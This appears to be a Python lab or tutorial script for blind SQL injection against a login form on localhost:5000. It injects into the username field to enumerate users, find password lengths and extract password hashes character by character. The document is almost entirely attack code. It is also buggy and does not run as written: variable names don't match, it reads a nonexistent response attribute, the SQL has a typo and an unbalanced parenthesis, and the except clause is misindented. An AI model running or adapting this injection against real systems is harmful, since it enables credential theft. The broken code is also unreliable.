#since we are working with web
import requests

total_requests = 0
charset = '0123456789abcdef'
#'0123456789abcdef' are being used because data being extracted are hashsums
target = "http://localhost:5000"
needle = "welcome admin"

#perfoming an injected query towards the web and identify fronm the response whether the request wasvalid or invalid
def injected_query(payload):
	global total_queries
	r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password":"password"})
	total_queries += 1
	return needle.encode() not in r.connect

#creating a boolean query which identifies at a certain offset whether a charcter is valid or invalid
def boolean_query(offset, user_id, character, operator=">"):
 payload = "(select hex(substr(password,{},1))from user where id = {}) {} hex('{}')".format(offset+1,user_id, operator, character)
 return injected_query(payload)

#exploiting sql injection to see if a user is valid or invalid
def invalid_user(user_id):
	payload = "(select id from user where id = {}) >= 0".format(user_id)
	return injected_query(payload)

#understanding the length of the users password
def password_length(user_id):
	i = 0
	while True:
		payload = "(select length(password) from user where id = {} and lenght(password) <= {} limit 1".format(user_id,i)
		if not injected_query(payload):
			return i
			i += 1

#extracting the users hash by iterating over potential character
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
				return found

#creating a function to see how many queries we have perfomed
def total_queries_taken():
 global total_queries
 print("\t\t[!] {} total queries!".format(total_queries))
 total_queries = 0

while True:
	try:
		user_id = input("> Enter a user ID to extract the possible password hash: ")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
			total_queries_taken()
		else:
			print("\t[X] sorry user {} doesn't exist!".format(user_id))
		except KeyboardInterrupt:
			break 
			#pressing CTRL+C allows us to break from the infinite loop